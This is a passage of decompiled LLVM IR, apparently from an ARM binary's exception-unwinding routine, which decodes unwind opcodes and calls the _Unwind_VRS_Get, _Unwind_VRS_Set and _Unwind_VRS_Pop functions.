  %v0_19750 = load i32, i32* %r0.global-to-local, align 4
  %v3_19750 = udiv i32 %v0_19750, 16777216
  %v1_19754 = urem i32 %v3_19750, 16
  %v3_19758 = mul i32 %v0_19750, 256
  store i32 %v3_19758, i32* %r0.global-to-local, align 4
  %v1_1975c = add nuw nsw i32 %v1_19754, 1
  store i32 %v1_1975c, i32* %r2.global-to-local, align 4
  %v1_19760 = and i32 %v3_19750, 240
  store i32 %v1_19760, i32* %r3.global-to-local, align 4
  %v1_19764 = load i32, i32* @r5, align 4
  %v2_19764 = inttoptr i32 %v1_19764 to i32*
  store i32 %v3_19758, i32* %v2_19764, align 4
  %v0_19768 = load i32, i32* %r2.global-to-local, align 4
  %v1_19768 = load i32, i32* %r3.global-to-local, align 4
  %v4_19768 = mul i32 %v1_19768, 4096
  %v5_19768 = or i32 %v4_19768, %v0_19768
  br label %dec_label_pc_1976c

dec_label_pc_1976c:                               ; preds = %dec_label_pc_1971c, %dec_label_pc_19750
  %storemerge131 = phi i32 [ %v5_19768, %dec_label_pc_19750 ], [ 720897, %dec_label_pc_1971c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_19774:                               ; preds = %dec_label_pc_19530
  %v0_19774 = load i32, i32* @r5, align 4
  %v1_19774 = add i32 %v0_19774, 8
  %v2_19774 = inttoptr i32 %v1_19774 to i8*
  %v3_19774 = load i8, i8* %v2_19774, align 1
  %v4_19774 = zext i8 %v3_19774 to i32
  store i32 %v4_19774, i32* %r3.global-to-local, align 4
  %v2_19778 = icmp eq i8 %v3_19774, 0
  store i1 %v2_19778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19778, label %dec_label_pc_19788, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_19774
  %v2_1977c = add nsw i32 %v4_19774, -1
  store i32 %v2_1977c, i32* %r3.global-to-local, align 4
  %v2_19780 = trunc i32 %v2_1977c to i8
  store i8 %v2_19780, i8* %v2_19774, align 1
  %v0_19784.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19784.pr.pr, label %.thread52.dec_label_pc_19788_crit_edge, label %dec_label_pc_197bc

.thread52.dec_label_pc_19788_crit_edge:           ; preds = %.thread52
  %v0_19788.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19788

dec_label_pc_19788:                               ; preds = %.thread52.dec_label_pc_19788_crit_edge, %dec_label_pc_19774
  %v2_197a0 = phi i32 [ %v0_19788.pre, %.thread52.dec_label_pc_19788_crit_edge ], [ %v0_19774, %dec_label_pc_19774 ]
  %v1_19788 = add i32 %v2_197a0, 9
  %v2_19788 = inttoptr i32 %v1_19788 to i8*
  %v3_19788 = load i8, i8* %v2_19788, align 1
  %v4_19788 = zext i8 %v3_19788 to i32
  store i32 %v4_19788, i32* %r3.global-to-local, align 4
  %v2_1978c = icmp eq i8 %v3_19788, 0
  store i1 %v2_1978c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1978c, label %dec_label_pc_197d8, label %dec_label_pc_1979c

dec_label_pc_1979c:                               ; preds = %dec_label_pc_19788
  %v1_1979c = add nsw i32 %v4_19788, -1
  store i32 %v1_1979c, i32* %r3.global-to-local, align 4
  %v1_197a0 = trunc i32 %v1_1979c to i8
  store i8 %v1_197a0, i8* %v2_19788, align 1
  %v0_197a4 = load i32, i32* @r5, align 4
  %v1_197a4 = add i32 %v0_197a4, 4
  %v2_197a4 = inttoptr i32 %v1_197a4 to i32*
  %v3_197a4 = load i32, i32* %v2_197a4, align 4
  store i32 %v3_197a4, i32* %r2.global-to-local, align 4
  %v1_197a8 = inttoptr i32 %v3_197a4 to i32*
  %v2_197a8 = load i32, i32* %v1_197a8, align 4
  store i32 %v2_197a8, i32* %r0.global-to-local, align 4
  %v4_197a8 = add i32 %v3_197a4, 4
  store i32 %v4_197a8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_197a8, i32* %v2_197a4, align 4
  %v0_197b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_197b4 = trunc i32 %v0_197b4 to i8
  %v2_197b4 = load i32, i32* @r5, align 4
  %v3_197b4 = add i32 %v2_197b4, 8
  %v4_197b4 = inttoptr i32 %v3_197b4 to i8*
  store i8 %v1_197b4, i8* %v4_197b4, align 1
  %v0_197b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_197b8 = load i32, i32* @r5, align 4
  %v2_197b8 = inttoptr i32 %v1_197b8 to i32*
  store i32 %v0_197b8, i32* %v2_197b8, align 4
  br label %dec_label_pc_197bc

dec_label_pc_197bc:                               ; preds = %.thread52, %dec_label_pc_1979c
  %v0_197bc = load i32, i32* %r0.global-to-local, align 4
  %v3_197bc = udiv i32 %v0_197bc, 16777216
  %v1_197c0 = urem i32 %v3_197bc, 16
  %v3_197c4 = mul i32 %v0_197bc, 256
  store i32 %v3_197c4, i32* %r0.global-to-local, align 4
  %v1_197c8 = add nuw nsw i32 %v1_197c0, 1
  store i32 %v1_197c8, i32* %r2.global-to-local, align 4
  %v1_197cc = and i32 %v3_197bc, 240
  store i32 %v1_197cc, i32* %r3.global-to-local, align 4
  %v1_197d0 = load i32, i32* @r5, align 4
  %v2_197d0 = inttoptr i32 %v1_197d0 to i32*
  store i32 %v3_197c4, i32* %v2_197d0, align 4
  %v0_197d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_197d4 = load i32, i32* %r3.global-to-local, align 4
  %v4_197d4 = mul i32 %v1_197d4, 4096
  %v5_197d4 = or i32 %v4_197d4, %v0_197d4
  br label %dec_label_pc_197d8

dec_label_pc_197d8:                               ; preds = %dec_label_pc_19788, %dec_label_pc_197bc
  %storemerge130 = phi i32 [ %v5_197d4, %dec_label_pc_197bc ], [ 720897, %dec_label_pc_19788 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_197e0:                               ; preds = %dec_label_pc_1950c
  %v0_197e0 = load i32, i32* @r5, align 4
  %v1_197e0 = add i32 %v0_197e0, 8
  %v2_197e0 = inttoptr i32 %v1_197e0 to i8*
  %v3_197e0 = load i8, i8* %v2_197e0, align 1
  %v4_197e0 = zext i8 %v3_197e0 to i32
  store i32 %v4_197e0, i32* %r3.global-to-local, align 4
  %v2_197e4 = icmp eq i8 %v3_197e0, 0
  store i1 %v2_197e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197e4, label %dec_label_pc_1998c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_197e0
  %v2_197e8 = add nsw i32 %v4_197e0, -1
  store i32 %v2_197e8, i32* %r3.global-to-local, align 4
  %v2_197ec = trunc i32 %v2_197e8 to i8
  store i8 %v2_197ec, i8* %v2_197e0, align 1
  %v0_197f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_197f0.pr.pr, label %.thread56.dec_label_pc_1998c_crit_edge, label %dec_label_pc_197f4

.thread56.dec_label_pc_1998c_crit_edge:           ; preds = %.thread56
  %v0_1998c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1998c

dec_label_pc_197f4:                               ; preds = %.thread56, %dec_label_pc_19998
  %v0_197f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_197f4 = udiv i32 %v0_197f4, 16777216
  store i32 %v3_197f4, i32* %r3.global-to-local, align 4
  store i32 %v3_197f4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_197f4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_197fc = mul i32 %v0_197f4, 256
  store i32 %v3_197fc, i32* %r0.global-to-local, align 4
  %v1_19800 = load i32, i32* @r5, align 4
  %v2_19800 = inttoptr i32 %v1_19800 to i32*
  store i32 %v3_197fc, i32* %v2_19800, align 4
  br i1 %tmp184, label %dec_label_pc_195bc, label %dec_label_pc_19808

dec_label_pc_19808:                               ; preds = %dec_label_pc_197f4
  %v0_19808 = load i32, i32* %r3.global-to-local, align 4
  %v1_19808 = and i32 %v0_19808, 240
  store i32 %v1_19808, i32* %r3.global-to-local, align 4
  %v2_19808 = icmp eq i32 %v1_19808, 0
  store i1 %v2_19808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19808, label %dec_label_pc_19810, label %dec_label_pc_195bc

dec_label_pc_19810:                               ; preds = %dec_label_pc_19808
  %v0_19810 = load i32, i32* @r7, align 4
  store i32 %v0_19810, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19818 = load i32, i32* %r2.global-to-local, align 4
  %v4_19818 = call i32 @_Unwind_VRS_Pop(i32 %v0_19810, i32 4, i32 %v2_19818, i32 0)
  store i32 %v4_19818, i32* %r0.global-to-local, align 4
  %v2_1981c = icmp eq i32 %v4_19818, 0
  store i1 %v2_1981c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1981c, label %dec_label_pc_192ec.backedge, label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %dec_label_pc_19810
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19414

dec_label_pc_1982c:                               ; preds = %dec_label_pc_19658
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19838 = load i32, i32* @r7, align 4
  store i32 %v0_19838, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_19844 = call i32 @_Unwind_VRS_Get(i32 %v0_19838, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19844, i32* %r0.global-to-local, align 4
  %v0_19848 = load i32, i32* @r5, align 4
  %v1_19848 = add i32 %v0_19848, 8
  %v2_19848 = inttoptr i32 %v1_19848 to i8*
  %v3_19848 = load i8, i8* %v2_19848, align 1
  %v4_19848 = zext i8 %v3_19848 to i32
  store i32 %v4_19848, i32* %r1.global-to-local, align 4
  %v2_1984c = icmp eq i8 %v3_19848, 0
  store i1 %v2_1984c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1984c, label %dec_label_pc_1985c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1982c
  %v2_19850 = add nsw i32 %v4_19848, -1
  store i32 %v2_19850, i32* %r3.global-to-local, align 4
  %v2_19854 = trunc i32 %v2_19850 to i8
  store i8 %v2_19854, i8* %v2_19848, align 1
  %v0_19858.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19858.pr.pr, label %.thread58.dec_label_pc_1985c_crit_edge, label %dec_label_pc_19888

.thread58.dec_label_pc_1985c_crit_edge:           ; preds = %.thread58
  %v0_1985c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1985c

dec_label_pc_1985c:                               ; preds = %.thread58.dec_label_pc_1985c_crit_edge, %dec_label_pc_1982c
  %v2_19870 = phi i32 [ %v0_1985c.pre, %.thread58.dec_label_pc_1985c_crit_edge ], [ %v0_19848, %dec_label_pc_1982c ]
  %v1_1985c = add i32 %v2_19870, 9
  %v2_1985c = inttoptr i32 %v1_1985c to i8*
  %v3_1985c = load i8, i8* %v2_1985c, align 1
  %v4_1985c = zext i8 %v3_1985c to i32
  store i32 %v4_1985c, i32* %r3.global-to-local, align 4
  %v2_19860 = icmp eq i8 %v3_1985c, 0
  store i1 %v2_19860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19860, label %bb158, label %dec_label_pc_1986c

bb158:                                            ; preds = %dec_label_pc_1985c
  %v1_19864 = load i32, i32* @r6, align 4
  store i32 %v1_19864, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_198b0

dec_label_pc_1986c:                               ; preds = %dec_label_pc_1985c
  %v1_1986c = add nsw i32 %v4_1985c, -1
  store i32 %v1_1986c, i32* %r3.global-to-local, align 4
  %v1_19870 = trunc i32 %v1_1986c to i8
  store i8 %v1_19870, i8* %v2_1985c, align 1
  %v0_19874 = load i32, i32* @r5, align 4
  %v1_19874 = add i32 %v0_19874, 4
  %v2_19874 = inttoptr i32 %v1_19874 to i32*
  %v3_19874 = load i32, i32* %v2_19874, align 4
  store i32 %v3_19874, i32* %r2.global-to-local, align 4
  %v1_19878 = inttoptr i32 %v3_19874 to i32*
  %v2_19878 = load i32, i32* %v1_19878, align 4
  store i32 %v2_19878, i32* %r0.global-to-local, align 4
  %v4_19878 = add i32 %v3_19874, 4
  store i32 %v4_19878, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19880 = inttoptr i32 %v0_19874 to i32*
  store i32 %v2_19878, i32* %v1_19880, align 4
  %v5_19880 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19880, i32* %v2_19874, align 4
  %v0_19884 = load i32, i32* %r3.global-to-local, align 4
  %v1_19884 = trunc i32 %v0_19884 to i8
  %v2_19884 = load i32, i32* @r5, align 4
  %v3_19884 = add i32 %v2_19884, 8
  %v4_19884 = inttoptr i32 %v3_19884 to i8*
  store i8 %v1_19884, i8* %v4_19884, align 1
  br label %dec_label_pc_19888

dec_label_pc_19888:                               ; preds = %.thread58, %dec_label_pc_1986c
  %v0_19888 = load i32, i32* @r5, align 4
  %v1_19888 = inttoptr i32 %v0_19888 to i32*
  %v2_19888 = load i32, i32* %v1_19888, align 4
  store i32 %v2_19888, i32* %r3.global-to-local, align 4
  %v3_1988c = mul i32 %v2_19888, 256
  store i32 %v3_1988c, i32* %r0.global-to-local, align 4
  %v3_19890 = udiv i32 %v2_19888, 16777216
  store i32 %v3_19890, i32* %r2.global-to-local, align 4
  store i32 %v3_1988c, i32* %v1_19888, align 4
  %v0_19898 = load i32, i32* %r2.global-to-local, align 4
  %v1_19898 = and i32 %v0_19898, 128
  %v2_19898 = icmp eq i32 %v1_19898, 0
  store i1 %v2_19898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19898, label %.thread129, label %dec_label_pc_198ac

.thread129:                                       ; preds = %dec_label_pc_19888
  %v4_1989c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1989c, i32* %ip.global-to-local, align 4
  %v1_198a0 = urem i32 %v0_19898, 256
  store i32 %v1_198a0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_19920

dec_label_pc_198ac:                               ; preds = %dec_label_pc_19888
  %v1_198a063 = urem i32 %v0_19898, 256
  store i32 %v1_198a063, i32* %r2.global-to-local, align 4
  %v0_198ac = load i32, i32* @r5, align 4
  %v1_198ac = add i32 %v0_198ac, 8
  %v2_198ac = inttoptr i32 %v1_198ac to i8*
  %v3_198ac = load i8, i8* %v2_198ac, align 1
  %v4_198ac = zext i8 %v3_198ac to i32
  store i32 %v4_198ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198b0

dec_label_pc_198b0:                               ; preds = %bb158, %dec_label_pc_198ac
  %v3_198d099 = phi i32 [ %v2_19870, %bb158 ], [ %v0_198ac, %dec_label_pc_198ac ]
  %v0_198b892 = phi i32 [ %v1_19864, %bb158 ], [ %v1_198a063, %dec_label_pc_198ac ]
  %v3_198b0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_198b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_198b8

dec_label_pc_198b8:                               ; preds = %dec_label_pc_198b8.backedge, %dec_label_pc_198b0
  %v3_198d0 = phi i32 [ %v3_198d0100, %dec_label_pc_198b8.backedge ], [ %v3_198d099, %dec_label_pc_198b0 ]
  %v0_198cc = phi i32 [ %v2_198bc.pre, %dec_label_pc_198b8.backedge ], [ 2, %dec_label_pc_198b0 ]
  %v0_198bc = phi i32 [ %v0_198bc.pre, %dec_label_pc_198b8.backedge ], [ %v3_198b0, %dec_label_pc_198b0 ]
  %v0_198b8 = phi i32 [ %v0_198b895, %dec_label_pc_198b8.backedge ], [ %v0_198b892, %dec_label_pc_198b0 ]
  %v1_198b8 = urem i32 %v0_198b8, 128
  %v7_198bc = shl i32 %v1_198b8, %v0_198cc
  %v8_198bc = add i32 %v7_198bc, %v0_198bc
  store i32 %v8_198bc, i32* %ip.global-to-local, align 4
  %v0_198c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_198c0 = icmp eq i32 %v0_198c0, 0
  store i1 %v2_198c0, i1* %cpsr_z.global-to-local, align 1
  %v1_198c4 = add i32 %v0_198c0, -1
  store i32 %v1_198c4, i32* %r3.global-to-local, align 4
  store i32 %v8_198bc, i32* %stack_var_-36, align 4
  %v1_198cc = add i32 %v0_198cc, 7
  store i32 %v1_198cc, i32* @lr, align 4
  br i1 %v2_198c0, label %dec_label_pc_198d8, label %bb159

bb159:                                            ; preds = %dec_label_pc_198b8
  %v2_198d0 = trunc i32 %v1_198c4 to i8
  %v4_198d0 = add i32 %v3_198d0, 8
  %v5_198d0 = inttoptr i32 %v4_198d0 to i8*
  store i8 %v2_198d0, i8* %v5_198d0, align 1
  %v0_198d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_198d4.pr, label %.dec_label_pc_198d8_crit_edge, label %dec_label_pc_19904

.dec_label_pc_198d8_crit_edge:                    ; preds = %bb159
  %v0_198d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_198d8

dec_label_pc_198d8:                               ; preds = %.dec_label_pc_198d8_crit_edge, %dec_label_pc_198b8
  %v2_198f0 = phi i32 [ %v0_198d8.pre, %.dec_label_pc_198d8_crit_edge ], [ %v3_198d0, %dec_label_pc_198b8 ]
  %v1_198d8 = add i32 %v2_198f0, 9
  %v2_198d8 = inttoptr i32 %v1_198d8 to i8*
  %v3_198d8 = load i8, i8* %v2_198d8, align 1
  %v4_198d8 = zext i8 %v3_198d8 to i32
  store i32 %v4_198d8, i32* %r3.global-to-local, align 4
  %v2_198dc = icmp eq i8 %v3_198d8, 0
  store i1 %v2_198dc, i1* %cpsr_z.global-to-local, align 1
  %v1_198e0 = add nsw i32 %v4_198d8, -1
  store i32 %v1_198e0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_198dc, label %dec_label_pc_198b8.backedge, label %dec_label_pc_198ec

dec_label_pc_198ec:                               ; preds = %dec_label_pc_198d8
  %v1_198ec = add i32 %v2_198f0, 4
  %v2_198ec = inttoptr i32 %v1_198ec to i32*
  %v3_198ec = load i32, i32* %v2_198ec, align 4
  store i32 %v3_198ec, i32* %r2.global-to-local, align 4
  %v1_198f0 = trunc i32 %v1_198e0 to i8
  store i8 %v1_198f0, i8* %v2_198d8, align 1
  %v0_198f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_198f4 = inttoptr i32 %v0_198f4 to i32*
  %v2_198f4 = load i32, i32* %v1_198f4, align 4
  store i32 %v2_198f4, i32* %r0.global-to-local, align 4
  %v4_198f4 = add i32 %v0_198f4, 4
  store i32 %v4_198f4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_198fc = load i32, i32* @r5, align 4
  %v3_198fc = add i32 %v2_198fc, 8
  %v4_198fc = inttoptr i32 %v3_198fc to i8*
  store i8 3, i8* %v4_198fc, align 1
  %v0_19900 = load i32, i32* @r5, align 4
  %v1_19900 = inttoptr i32 %v0_19900 to i32*
  %v2_19900 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19900, i32* %v1_19900, align 4
  %v3_19900 = add i32 %v0_19900, 4
  %v4_19900 = inttoptr i32 %v3_19900 to i32*
  %v5_19900 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19900, i32* %v4_19900, align 4
  br label %dec_label_pc_19904

dec_label_pc_19904:                               ; preds = %bb159, %dec_label_pc_198ec
  %v0_19904 = load i32, i32* @r5, align 4
  %v1_19904 = inttoptr i32 %v0_19904 to i32*
  %v2_19904 = load i32, i32* %v1_19904, align 4
  store i32 %v2_19904, i32* %r3.global-to-local, align 4
  %v3_19908 = udiv i32 %v2_19904, 16777216
  store i32 %v3_19908, i32* %r2.global-to-local, align 4
  %v1_1990c = and i32 %v3_19908, 128
  %v2_1990c = icmp eq i32 %v1_1990c, 0
  store i1 %v2_1990c, i1* %cpsr_z.global-to-local, align 1
  %v3_19910 = mul i32 %v2_19904, 256
  store i32 %v3_19910, i32* %r0.global-to-local, align 4
  store i32 %v3_19910, i32* %v1_19904, align 4
  %v0_19918 = load i32, i32* %r2.global-to-local, align 4
  %v1_19918 = urem i32 %v0_19918, 256
  store i32 %v1_19918, i32* %r2.global-to-local, align 4
  br i1 %v2_1990c, label %dec_label_pc_19920.loopexit, label %dec_label_pc_1994c

dec_label_pc_19920.loopexit:                      ; preds = %dec_label_pc_19904
  %v0_19924.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19928.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19920

dec_label_pc_19920:                               ; preds = %dec_label_pc_19920.loopexit, %.thread129
  %v2_19928 = phi i32 [ 2, %.thread129 ], [ %v2_19928.pre, %dec_label_pc_19920.loopexit ]
  %v0_19924 = phi i32 [ %v4_1989c, %.thread129 ], [ %v0_19924.pre, %dec_label_pc_19920.loopexit ]
  %v0_19920 = phi i32 [ %v1_198a0, %.thread129 ], [ %v1_19918, %dec_label_pc_19920.loopexit ]
  %v1_19920 = urem i32 %v0_19920, 128
  %v1_19924 = add i32 %v0_19924, 516
  %v7_19928 = shl i32 %v1_19920, %v2_19928
  %v8_19928 = add i32 %v1_19924, %v7_19928
  store i32 %v8_19928, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19930 = load i32, i32* @r7, align 4
  store i32 %v0_19930, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_19928, i32* %stack_var_-36, align 4
  %v5_19944 = call i32 @_Unwind_VRS_Set(i32 %v0_19930, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_192ec.backedge

dec_label_pc_1994c:                               ; preds = %dec_label_pc_19904
  %v0_1994c = load i32, i32* @r5, align 4
  %v1_1994c = add i32 %v0_1994c, 8
  %v2_1994c = inttoptr i32 %v1_1994c to i8*
  %v3_1994c = load i8, i8* %v2_1994c, align 1
  %v4_1994c = zext i8 %v3_1994c to i32
  store i32 %v4_1994c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198b8.backedge

dec_label_pc_198b8.backedge:                      ; preds = %dec_label_pc_1994c, %dec_label_pc_198d8
  %v3_198d0100 = phi i32 [ %v0_1994c, %dec_label_pc_1994c ], [ %v2_198f0, %dec_label_pc_198d8 ]
  %v0_198b895 = phi i32 [ %v1_19918, %dec_label_pc_1994c ], [ 176, %dec_label_pc_198d8 ]
  %v0_198bc.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_198bc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_198b8

dec_label_pc_19954:                               ; preds = %dec_label_pc_19650
  %v0_19954 = load i32, i32* @r5, align 4
  %v1_19954 = add i32 %v0_19954, 8
  %v2_19954 = inttoptr i32 %v1_19954 to i8*
  %v3_19954 = load i8, i8* %v2_19954, align 1
  %v4_19954 = zext i8 %v3_19954 to i32
  store i32 %v4_19954, i32* %r3.global-to-local, align 4
  %v2_19958 = icmp eq i8 %v3_19954, 0
  store i1 %v2_19958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19958, label %dec_label_pc_199bc, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_19954
  %v2_1995c = add nsw i32 %v4_19954, -1
  store i32 %v2_1995c, i32* %r3.global-to-local, align 4
  %v2_19960 = trunc i32 %v2_1995c to i8
  store i8 %v2_19960, i8* %v2_19954, align 1
  %v0_19964.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19964.pr.pr, label %.thread66.dec_label_pc_199bc_crit_edge, label %dec_label_pc_19968

.thread66.dec_label_pc_199bc_crit_edge:           ; preds = %.thread66
  %v0_199bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_199bc

dec_label_pc_19968:                               ; preds = %.thread66, %dec_label_pc_199c8
  %v0_19968 = load i32, i32* %r0.global-to-local, align 4
  %v3_19968 = udiv i32 %v0_19968, 16777216
  store i32 %v3_19968, i32* %r3.global-to-local, align 4
  store i32 %v3_19968, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_19968, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_19970 = mul i32 %v0_19968, 256
  store i32 %v3_19970, i32* %r0.global-to-local, align 4
  %v1_19974 = load i32, i32* @r5, align 4
  %v2_19974 = inttoptr i32 %v1_19974 to i32*
  store i32 %v3_19970, i32* %v2_19974, align 4
  br i1 %tmp185, label %dec_label_pc_195bc, label %dec_label_pc_1997c

dec_label_pc_1997c:                               ; preds = %dec_label_pc_19968
  %v0_1997c = load i32, i32* %r3.global-to-local, align 4
  %v1_1997c = and i32 %v0_1997c, 240
  store i32 %v1_1997c, i32* %r1.global-to-local, align 4
  %v2_1997c = icmp eq i32 %v1_1997c, 0
  store i1 %v2_1997c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1997c, label %dec_label_pc_1997c.dec_label_pc_195ec_crit_edge, label %dec_label_pc_19984

dec_label_pc_1997c.dec_label_pc_195ec_crit_edge:  ; preds = %dec_label_pc_1997c
  %v2_195f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_19984:                               ; preds = %dec_label_pc_1997c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19414

dec_label_pc_1998c:                               ; preds = %.thread56.dec_label_pc_1998c_crit_edge, %dec_label_pc_197e0
  %v2_1999c = phi i32 [ %v0_1998c.pre, %.thread56.dec_label_pc_1998c_crit_edge ], [ %v0_197e0, %dec_label_pc_197e0 ]
  %v1_1998c = add i32 %v2_1999c, 9
  %v2_1998c = inttoptr i32 %v1_1998c to i8*
  %v3_1998c = load i8, i8* %v2_1998c, align 1
  %v4_1998c = zext i8 %v3_1998c to i32
  store i32 %v4_1998c, i32* %r3.global-to-local, align 4
  %v2_19990 = icmp eq i8 %v3_1998c, 0
  store i1 %v2_19990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19990, label %dec_label_pc_195bc, label %dec_label_pc_19998

dec_label_pc_19998:                               ; preds = %dec_label_pc_1998c
  %v1_19998 = add nsw i32 %v4_1998c, -1
  store i32 %v1_19998, i32* %r3.global-to-local, align 4
  %v1_1999c = trunc i32 %v1_19998 to i8
  store i8 %v1_1999c, i8* %v2_1998c, align 1
  %v0_199a0 = load i32, i32* @r5, align 4
  %v1_199a0 = add i32 %v0_199a0, 4
  %v2_199a0 = inttoptr i32 %v1_199a0 to i32*
  %v3_199a0 = load i32, i32* %v2_199a0, align 4
  store i32 %v3_199a0, i32* %r2.global-to-local, align 4
  %v1_199a4 = inttoptr i32 %v3_199a0 to i32*
  %v2_199a4 = load i32, i32* %v1_199a4, align 4
  store i32 %v2_199a4, i32* %r0.global-to-local, align 4
  %v4_199a4 = add i32 %v3_199a0, 4
  store i32 %v4_199a4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_199a4, i32* %v2_199a0, align 4
  %v0_199b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_199b0 = trunc i32 %v0_199b0 to i8
  %v2_199b0 = load i32, i32* @r5, align 4
  %v3_199b0 = add i32 %v2_199b0, 8
  %v4_199b0 = inttoptr i32 %v3_199b0 to i8*
  store i8 %v1_199b0, i8* %v4_199b0, align 1
  %v0_199b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_199b4 = load i32, i32* @r5, align 4
  %v2_199b4 = inttoptr i32 %v1_199b4 to i32*
  store i32 %v0_199b4, i32* %v2_199b4, align 4
  br label %dec_label_pc_197f4

dec_label_pc_199bc:                               ; preds = %.thread66.dec_label_pc_199bc_crit_edge, %dec_label_pc_19954
  %v2_199cc = phi i32 [ %v0_199bc.pre, %.thread66.dec_label_pc_199bc_crit_edge ], [ %v0_19954, %dec_label_pc_19954 ]
  %v1_199bc = add i32 %v2_199cc, 9
  %v2_199bc = inttoptr i32 %v1_199bc to i8*
  %v3_199bc = load i8, i8* %v2_199bc, align 1
  %v4_199bc = zext i8 %v3_199bc to i32
  store i32 %v4_199bc, i32* %r3.global-to-local, align 4
  %v2_199c0 = icmp eq i8 %v3_199bc, 0
  store i1 %v2_199c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_199c0, label %dec_label_pc_195bc, label %dec_label_pc_199c8

dec_label_pc_199c8:                               ; preds = %dec_label_pc_199bc
  %v1_199c8 = add nsw i32 %v4_199bc, -1
  store i32 %v1_199c8, i32* %r3.global-to-local, align 4
  %v1_199cc = trunc i32 %v1_199c8 to i8
  store i8 %v1_199cc, i8* %v2_199bc, align 1
  %v0_199d0 = load i32, i32* @r5, align 4
  %v1_199d0 = add i32 %v0_199d0, 4
  %v2_199d0 = inttoptr i32 %v1_199d0 to i32*
  %v3_199d0 = load i32, i32* %v2_199d0, align 4
  store i32 %v3_199d0, i32* %r2.global-to-local, align 4
  %v1_199d4 = inttoptr i32 %v3_199d0 to i32*
  %v2_199d4 = load i32, i32* %v1_199d4, align 4
  store i32 %v2_199d4, i32* %r0.global-to-local, align 4
  %v4_199d4 = add i32 %v3_199d0, 4
  store i32 %v4_199d4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_199d4, i32* %v2_199d0, align 4
  %v0_199e0 = load i32, i32* %r3.global-to-local, align 4
